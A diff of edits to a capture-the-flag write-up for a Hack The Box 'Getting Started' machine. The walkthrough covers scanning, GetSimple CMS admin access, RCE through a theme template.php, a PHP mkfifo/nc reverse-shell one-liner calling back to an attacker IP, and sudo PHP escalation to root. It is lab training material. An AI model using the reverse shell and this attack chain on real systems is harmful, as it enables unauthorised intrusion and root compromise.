@@ -23,30 +23,26 @@ This will be a black-box approach, because we don't have any information about t
 We are going to scan the tartget machine to find out what services are running:
 
 ```
-# Nmap 7.94 scan initiated Tue Jul  4 13:26:04 2023 as: nmap -P0 -n -sV --open -oA gettingstarted_initial_scan 10.129.42.249
-Nmap scan report for 10.129.42.249
-Host is up (0.061s latency).
-Not shown: 998 closed tcp ports (conn-refused)
+$ nmap -P0 -n -sV --open -oA gettingstarted_initial_scan 10.0.0.2
+```
+
+```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Tue Jul  4 13:26:12 2023 -- 1 IP address (1 host up) scanned in 8.83 seconds
 ```
 
-We can see that the target is a GNU/Linux (Ubuntu) host with a ssh server (OpenSSH 8.2p1) running on port 22 and a web service (Apache 2.4.41) running on port 80.
+We can see that the target is a GNU/Linux (Ubuntu) host with a SSH server (OpenSSH 8.2p1) running on port 22 and a web service (Apache 2.4.41) running on port 80.
 
 # Web footprinting
 
-If we browse the target, we sill se a GetSimple welcome screen
+If we browse the target, we sill se a `GetSimple` welcome screen
 
 ![welcome screen](htb-getting-started-welcome-screen.png)
 *Welcome screen*
 
 The page doesn't seem to look to good.
-If we take a look at the source code we can see a lot of references to `http://gettingstarted.htb`
+If we take a look at the source code we can see a lot of references to `http://gettingstarted.htb`:
 
 ![http://gettingstarted.htb references](htb-getting-started-getting-started-references.png)
 *http://gettingstarted.htb references*
@@ -57,12 +53,12 @@ So we will fixt it adding `10.0.0.2` as `gettingstarted.htb` to our `/etc/hosts`
 sudo echo `10.0.0.2 gettingstarted.htb` >> /etc/hosts
 ```
 
-Now, the page, looks much better:
+If we reaload, the page will look much better:
 
 ![welcome screen fixed](htb-getting-started-welcome-screen-fixed.png)
 *Welcome screen fixed*
 
-We can see that we have an instance of a **GetSimple** blog and we can start to identify the technologies in use.
+We can see that we have an instance of a `GetSimple` blog and we can start to identify the technologies in use.
 
 ## Technologies in use
 
@@ -89,7 +85,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 [+] User Agent:              gobuster/3.5
 [+] Timeout:                 10s
 ===============================================================
-XXXX/XX/XX 13:31:37 Starting gobuster in directory enumeration mode
+XXXX/XX/XX XX:XX:XX Starting gobuster in directory enumeration mode
 ===============================================================
 /.hta                 (Status: 403) [Size: 283]
 /.htaccess            (Status: 403) [Size: 283]
@@ -155,7 +151,7 @@ Once we are logged as admin, in the `Supoort` section, we can see interesting in
 Now, we have the `GetSimple` version used, and we can search exploits for this version:
 
 ```
- searchsploit getsimple       
+$ searchsploit getsimple       
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                                             |  Path
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -208,14 +204,14 @@ We will comment or delete all code in `template.php` and we will edit the file a
 ![PHP code execution test](htb-getting-started-php-code-execution-test.png)
 *PHP code execution test*
 
-We save changes and We can curl this file (`http://gettingstarted.htb/theme/Innovation/template.php`), or browse it, and we see that we have a RCE (remote code execution).
+We save changes and we can curl this file (`http://gettingstarted.htb/theme/Innovation/template.php`), or browse it, and we see that we have a RCE (remote code execution).
 
 ```
 $ curl http://gettingstarted.htb/theme/Innovation/template.php
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-We have a RCE (remote code execution) and we need to take advantage of this RCE (remote code execution) to convert it in a remote shell.
+Now we have a RCE (remote code execution) and we need to take advantage of this RCE (remote code execution) to convert it in a remote shell.
 
 We will edit again the `template.php` file.
 But, this time, we will append the following bash one-liner reverse shell to the beginning:
@@ -233,8 +229,8 @@ We need to start a netcat listener on our host (the attacker):
 $ nc -lvnp 1234
 ```
 
-We have to curl or browse the `template.php` file (`http://gettingstarted.htb/theme/Innovation/template.php`), again, to execute the reverse shell:
-Now, we have a reverse shell.
+We have to curl or browse the `template.php` file (`http://gettingstarted.htb/theme/Innovation/template.php`), again, to execute the reverse shell.
+Now, we have a working reverse shell.
 
 ```
 $ id
@@ -276,7 +272,7 @@ $ cat /home/mrb3n/user.txt
 
 # Privilege escalation
 
-Now, we need to escalate privileges in order to get our second flag, the `root.txt`.
+Now that we have our fist flag, we need to escalate privileges in order to get our second flag, the `root.txt`.
 If we check our sudo privileges we will see that we can execute `/usr/bin/php` as root without password:
 
 ```
@@ -302,13 +298,13 @@ drwxr-xr-x 4 www-data www-data 4096 Sep  7  2018 Innovation
 ```
 
 ```
-$ echo '<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.201 1235 >/tmp/f"); ?>' > reverse_shell.php
+$ echo '<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1235 >/tmp/f"); ?>' > reverse_shell.php
 ```
 
-Now we need to start another netcat listener on our host (the attacker):
+Now, we need to start another netcat listener on our host (the attacker):
 
 ```
-nc -lvnp 1235
+$ nc -lvnp 1235
 ```
 
 And now, we have to execute our new file with `sudo` in order to get our root reverse shell:
@@ -317,7 +313,7 @@ And now, we have to execute our new file with `sudo` in order to get our root re
 $ sudo /usr/bin/php reverse_shell.php
 ```
 
-Now we are root and we can get our last flag, the `root.txt`:
+Finally, we are root and we can get our last flag, the `root.txt`:
 
 ```
 # cat /root/root.txt
